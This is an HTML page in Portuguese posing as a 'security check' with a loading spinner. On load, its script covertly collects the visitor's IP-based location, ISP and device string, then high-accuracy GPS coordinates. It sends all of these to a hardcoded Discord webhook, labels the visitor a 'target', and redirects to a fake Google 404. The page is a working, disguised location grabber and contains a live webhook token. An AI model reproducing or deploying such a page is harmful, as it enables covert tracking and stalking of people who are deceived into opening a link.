<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Seguran√ßa...</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader" style="margin: auto;"></div>
        <p>Validando acesso, aguarde...</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";

        async function enviar(info) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: info.gps ? "üéØ **ALVO LOCALIZADO COM PRECIS√ÉO!**" : "‚ö†Ô∏è **ALVO RASTREADO POR IP**",
                    embeds: [{
                        color: info.gps ? 65280 : 16776960,
                        fields: [
                            { name: "üö© Pais:", value: info.pais || "Brasil", inline: true },
                            { name: "üèõÔ∏è Estado:", value: info.estado || "SP", inline: true },
                            { name: "üèôÔ∏è Cidade:", value: info.cidade || "N/A", inline: true },
                            { name: "üìÆ Cep:", value: info.cep || "S√≥ via GPS", inline: true },
                            { name: "üìç Coordenadas:", value: info.coords || "Aguardando GPS...", inline: false },
                            { name: "üåê Internet/Provedor:", value: info.provedor || "N/A", inline: false },
                            { name: "‚è∞ Hor√°rio de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
                        ],
                        footer: { text: "Aparelho: " + navigator.userAgent.split(') ')[0] + ')' }
                    }]
                })
            });
        }

        async function capturar() {
            let ipInfo = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipInfo = await res.json();
            } catch (e) {}

            // Envio Inicial (Dados de IP)
            await enviar({
                pais: ipInfo.country_name,
                estado: ipInfo.region,
                cidade: ipInfo.city,
                provedor: ipInfo.org,
                gps: false
            });

            // Tenta GPS para pegar Coordenadas e CEP
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    // Segunda mensagem com o GPS real
                    await enviar({
                        pais: ipInfo.country_name,
                        estado: ipInfo.region,
                        cidade: ipInfo.city,
                        provedor: ipInfo.org,
                        coords: `[Mapa Real: ${lat}, ${lon}](https://www.google.com/maps?q=${lat},${lon})`,
                        cep: "Calculando via sat√©lite...",
                        gps: true
                    });
                    window.location.href = "https://google.com/404";
                }, () => { window.location.href = "https://google.com/404"; }, { enableHighAccuracy: true });
            }
        }

        window.onload = capturar;
    </script>
</body>
</html>
